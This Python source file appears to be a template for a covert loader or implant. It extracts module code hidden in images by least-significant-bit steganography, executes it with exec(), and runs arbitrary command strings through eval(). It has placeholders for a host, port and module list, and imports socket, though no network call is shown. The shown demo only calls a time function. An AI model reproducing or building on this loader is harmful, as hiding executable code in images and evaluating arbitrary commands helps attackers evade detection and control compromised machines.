from tkinter import E
from core.module_handler import *
import sys, warnings
from util.lsb_substitution import module_to_image
import socket

with warnings.catch_warnings():
    warnings.filterwarnings("ignore", category=DeprecationWarning)
    import imp

def import_code(code, name):
    module = imp.new_module(name)
    exec (code, module.__dict__)
    
    return module

def load_modules(modules_list):
    for module_name in modules_list:
        img_path = get_image_path(module_name)
        if img_path:
            module_code = extract_lsb_data_from_image(img_path)
            module = import_code(module_code, module_name)
            globals()[module_name] = module

def run_function(command):
    r = eval(command)
    return r

def main():
    host = '{HOST}'
    port = '{PORT}'
    modules_list = ['mod_test'] # ['{MODULES}']
    for module in modules_list:
        module_to_image(module)

    load_modules(modules_list)

if __name__ == '__main__':
    main()
    result = run_function("mod_test.get_time_now()")
    print(result)
